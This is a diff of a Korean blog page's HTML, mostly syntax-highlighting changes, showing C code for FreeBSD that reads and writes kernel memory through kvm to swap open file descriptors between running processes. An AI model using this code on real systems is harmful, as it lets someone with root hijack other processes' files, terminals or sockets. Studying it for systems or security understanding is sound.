+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;fds changed in memory while using them - try again</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    writeval(ad1, val2);
-</span></span><span style=display:flex><span>    writeval(ad2, val1);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>writeval</span>(ad1, val2);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>writeval</span>(ad2, val1);
 </span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;Done!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Done!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
 </span></span><span style=display:flex><span>}
 </span></span></code></pre></div><h2 id=the-freebsd-code>The FreeBSD Code</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-c data-lang=c><span style=display:flex><span>he FreeBSD code
 </span></span><span style=display:flex><span><span style=color:#f92672>----------------</span>
@@ -313,7 +312,7 @@ fd 3을 쓰고 있다는것을 알아 냈을때.</p><p>그렇다면,</p><div cla
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#define FILES ((char *)&amp;p.p_fd - (char *)&amp;p)
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#define AD(fd) (readvalz(readvalz(procp + FILES)) + 4*(fd))
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span>kvm_t <span style=color:#f92672>*</span>kfd;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>kvm_t</span> <span style=color:#f92672>*</span>kfd;
 </span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> proc p;
 </span></span><span style=display:flex><span>u_long procp, allproc;
 </span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> nlist nm[<span style=color:#ae81ff>2</span>];
@@ -321,38 +320,38 @@ fd 3을 쓰고 있다는것을 알아 냈을때.</p><p>그렇다면,</p><div cla
 </span></span><span style=display:flex><span>u_long <span style=color:#a6e22e>readval</span>(u_long ad) {
 </span></span><span style=display:flex><span>  u_long val;
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (kvm_read(kfd, ad, <span style=color:#f92672>&amp;</span>val, <span style=color:#ae81ff>4</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span>)
-</span></span><span style=display:flex><span>    fprintf(stderr, <span style=color:#e6db74>&#34;error reading...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>kvm_read</span>(kfd, ad, <span style=color:#f92672>&amp;</span>val, <span style=color:#ae81ff>4</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;error reading...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> val;
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>u_long <span style=color:#a6e22e>readvalz</span>(u_long ad) {
-</span></span><span style=display:flex><span>  u_long r <span style=color:#f92672>=</span> readval(ad);
+</span></span><span style=display:flex><span>  u_long r <span style=color:#f92672>=</span> <span style=color:#a6e22e>readval</span>(ad);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (r <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>    fprintf(stderr, <span style=color:#e6db74>&#34;NULL pointer found (fd not open?)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;NULL pointer found (fd not open?)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> r;
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>writeval</span>(u_long ad, u_long val) {
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (kvm_write(kfd, ad, <span style=color:#f92672>&amp;</span>val, <span style=color:#ae81ff>4</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span>)
-</span></span><span style=display:flex><span>    fprintf(stderr, <span style=color:#e6db74>&#34;error writing...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>kvm_write</span>(kfd, ad, <span style=color:#f92672>&amp;</span>val, <span style=color:#ae81ff>4</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;error writing...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readproc</span>(u_long ad) {
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (kvm_read(kfd, ad, <span style=color:#f92672>&amp;</span>p, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> proc)) <span style=color:#f92672>!=</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> proc))
-</span></span><span style=display:flex><span>    fprintf(stderr, <span style=color:#e6db74>&#34;error reading a struct proc...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>kvm_read</span>(kfd, ad, <span style=color:#f92672>&amp;</span>p, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> proc)) <span style=color:#f92672>!=</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> proc))
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;error reading a struct proc...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>findproc</span>(<span style=color:#66d9ef>int</span> pid) {
 </span></span><span style=display:flex><span>  u_long adr;
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (adr <span style=color:#f92672>=</span> readval(allproc); adr; adr <span style=color:#f92672>=</span> readval(adr <span style=color:#f92672>+</span> NEXTP)) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (adr <span style=color:#f92672>=</span> <span style=color:#a6e22e>readval</span>(allproc); adr; adr <span style=color:#f92672>=</span> <span style=color:#a6e22e>readval</span>(adr <span style=color:#f92672>+</span> NEXTP)) {
 </span></span><span style=display:flex><span>    procp <span style=color:#f92672>=</span> adr;
-</span></span><span style=display:flex><span>    readproc(procp);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>readproc</span>(procp);
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (p.p_pid <span style=color:#f92672>==</span> pid) <span style=color:#66d9ef>return</span>;
 </span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>  fprintf(stderr, <span style=color:#e6db74>&#34;Process not found</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-</span></span><span style=display:flex><span>  exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Process not found</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv) {
@@ -361,66 +360,65 @@ fd 3을 쓰고 있다는것을 알아 냈을때.</p><p>그렇다면,</p><div cla
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> three<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>5</span> <span style=color:#f92672>&amp;&amp;</span> argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>7</span>)
-</span></span><span style=display:flex><span>    fprintf(stderr, <span style=color:#e6db74>&#34;Use: %s pid1 fd1 pid2 fd2 [pid3 fd3]</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]), 
-</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Use: %s pid1 fd1 pid2 fd2 [pid3 fd3]</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]), 
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  pid1 <span style=color:#f92672>=</span> atoi(argv[<span style=color:#ae81ff>1</span>]), fd1 <span style=color:#f92672>=</span> atoi(argv[<span style=color:#ae81ff>2</span>]);
-</span></span><span style=display:flex><span>  pid2 <span style=color:#f92672>=</span> atoi(argv[<span style=color:#ae81ff>3</span>]), fd2 <span style=color:#f92672>=</span> atoi(argv[<span style=color:#ae81ff>4</span>]);
+</span></span><span style=display:flex><span>  pid1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#ae81ff>1</span>]), fd1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#ae81ff>2</span>]);
+</span></span><span style=display:flex><span>  pid2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#ae81ff>3</span>]), fd2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#ae81ff>4</span>]);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>==</span> <span style=color:#ae81ff>7</span>)
-</span></span><span style=display:flex><span>    pid3 <span style=color:#f92672>=</span> atoi(argv[<span style=color:#ae81ff>5</span>]), fd3 <span style=color:#f92672>=</span> atoi(argv[<span style=color:#ae81ff>6</span>]), three<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>    pid3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#ae81ff>5</span>]), fd3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#ae81ff>6</span>]), three<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>;
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (pid1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>    pid1 <span style=color:#f92672>=</span> getpid(), fd1 <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/dev/null&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>    pid1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>getpid</span>(), fd1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;/dev/null&#34;</span>, O_RDWR);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (pid2 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>    pid2 <span style=color:#f92672>=</span> getpid(), fd2 <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/dev/null&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>    pid2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>getpid</span>(), fd2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;/dev/null&#34;</span>, O_RDWR);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (three <span style=color:#f92672>&amp;&amp;</span> pid3 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>    pid3 <span style=color:#f92672>=</span> getpid(), fd3 <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/dev/null&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>    pid3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>getpid</span>(), fd3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;/dev/null&#34;</span>, O_RDWR);
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  kfd <span style=color:#f92672>=</span> kvm_open(NULL, NULL, NULL, O_RDWR, <span style=color:#e6db74>&#34;chfd&#34;</span>);
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (kfd <span style=color:#f92672>==</span> NULL) exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  kfd <span style=color:#f92672>=</span> <span style=color:#a6e22e>kvm_open</span>(NULL, NULL, NULL, O_RDWR, <span style=color:#e6db74>&#34;chfd&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (kfd <span style=color:#f92672>==</span> NULL) <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  bzero(nm, <span style=color:#ae81ff>2</span><span style=color:#f92672>*</span><span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> nlist));
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>bzero</span>(nm, <span style=color:#ae81ff>2</span><span style=color:#f92672>*</span><span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> nlist));
 </span></span><span style=display:flex><span>  nm[<span style=color:#ae81ff>0</span>].n_name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;_allproc&#34;</span>;
 </span></span><span style=display:flex><span>  nm[<span style=color:#ae81ff>1</span>].n_name <span style=color:#f92672>=</span> NULL;
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (kvm_nlist(kfd, nm) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>    fprintf(stderr, <span style=color:#e6db74>&#34;Can&#39;t read kernel name list</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>kvm_nlist</span>(kfd, nm) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Can&#39;t read kernel name list</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>  allproc <span style=color:#f92672>=</span> nm[<span style=color:#ae81ff>0</span>].n_value;
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  findproc(pid1);
-</span></span><span style=display:flex><span>  ad1 <span style=color:#f92672>=</span> AD(fd1);
-</span></span><span style=display:flex><span>  val1 <span style=color:#f92672>=</span> readvalz(ad1);
-</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;Found fd pointer 1, value %.8x, stored at %.8x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val1, ad1);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>findproc</span>(pid1);
+</span></span><span style=display:flex><span>  ad1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>AD</span>(fd1);
+</span></span><span style=display:flex><span>  val1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>readvalz</span>(ad1);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Found fd pointer 1, value %.8x, stored at %.8x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val1, ad1);
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  findproc(pid2);
-</span></span><span style=display:flex><span>  ad2 <span style=color:#f92672>=</span> AD(fd2);
-</span></span><span style=display:flex><span>  val2 <span style=color:#f92672>=</span> readvalz(ad2);
-</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;Found fd pointer 2, value %.8x, stored at %.8x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val2, ad2);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>findproc</span>(pid2);
+</span></span><span style=display:flex><span>  ad2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>AD</span>(fd2);
+</span></span><span style=display:flex><span>  val2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>readvalz</span>(ad2);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Found fd pointer 2, value %.8x, stored at %.8x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val2, ad2);
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (three) {
-</span></span><span style=display:flex><span>    findproc(pid3);
-</span></span><span style=display:flex><span>    ad3 <span style=color:#f92672>=</span> AD(fd3);
-</span></span><span style=display:flex><span>    val3 <span style=color:#f92672>=</span> readvalz(ad3);
-</span></span><span style=display:flex><span>    printf(<span style=color:#e6db74>&#34;Found fd pointer 3, value %.8x, stored at %.8x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val3, ad3);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>findproc</span>(pid3);
+</span></span><span style=display:flex><span>    ad3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>AD</span>(fd3);
+</span></span><span style=display:flex><span>    val3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>readvalz</span>(ad3);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Found fd pointer 3, value %.8x, stored at %.8x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val3, ad3);
 </span></span><span style=display:flex><span>  }
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (three) {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (readval(ad1)<span style=color:#f92672>!=</span>val1 <span style=color:#f92672>||</span> readval(ad2)<span style=color:#f92672>!=</span>val2 <span style=color:#f92672>||</span> readval(ad3)<span style=color:#f92672>!=</span>val3) {
-</span></span><span style=display:flex><span>      fprintf(stderr, <span style=color:#e6db74>&#34;fds changed in memory while using them - try again</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-</span></span><span style=display:flex><span>      exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>readval</span>(ad1)<span style=color:#f92672>!=</span>val1 <span style=color:#f92672>||</span> <span style=color:#a6e22e>readval</span>(ad2)<span style=color:#f92672>!=</span>val2 <span style=color:#f92672>||</span> <span style=color:#a6e22e>readval</span>(ad3)<span style=color:#f92672>!=</span>val3) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;fds changed in memory while using them - try again</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    writeval(ad2, val1);
-</span></span><span style=display:flex><span>    writeval(ad3, val2);
-</span></span><span style=display:flex><span>    writeval(ad1, val3);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>writeval</span>(ad2, val1);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>writeval</span>(ad3, val2);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>writeval</span>(ad1, val3);
 </span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (readval(ad1)<span style=color:#f92672>!=</span>val1 <span style=color:#f92672>||</span> readval(ad2)<span style=color:#f92672>!=</span>val2) {
-</span></span><span style=display:flex><span>      fprintf(stderr, <span style=color:#e6db74>&#34;fds changed in memory while using them - try again</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-</span></span><span style=display:flex><span>      exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>readval</span>(ad1)<span style=color:#f92672>!=</span>val1 <span style=color:#f92672>||</span> <span style=color:#a6e22e>readval</span>(ad2)<span style=color:#f92672>!=</span>val2) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;fds changed in memory while using them - try again</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    writeval(ad1, val2);
-</span></span><span style=display:flex><span>    writeval(ad2, val1);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>writeval</span>(ad1, val2);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>writeval</span>(ad2, val1);
 </span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;Done!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Done!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
 </span></span><span style=display:flex><span>}
 </span></span></code></pre></div><div class=footer></div><a href=about/>About this blog</a><br>Younjin JEONG: <a href="mailto: younjin.jeong@gmail.com">younjin.jeong@gmail.com</a><br>Powered by <a href=https://gohugo.io/>Hugo</a> with
-<a href=https://github.com/mrmierzejewski/hugo-theme-console/>Console Theme</a>.<br><a href=https://opensource.org/licenses/LGPL-3.0>Terms and Conditions</a></br></div><script async src="https://www.googletagmanager.com/gtag/js?id=G-LF5W12M5RW"></script>
-<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-LF5W12M5RW")</script></div></body></html>
+<a href=https://github.com/mrmierzejewski/hugo-theme-console/>Console Theme</a>.<br></div><script async src="https://www.googletagmanager.com/gtag/js?id=G-LF5W12M5RW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-LF5W12M5RW")</script></div></body></html>
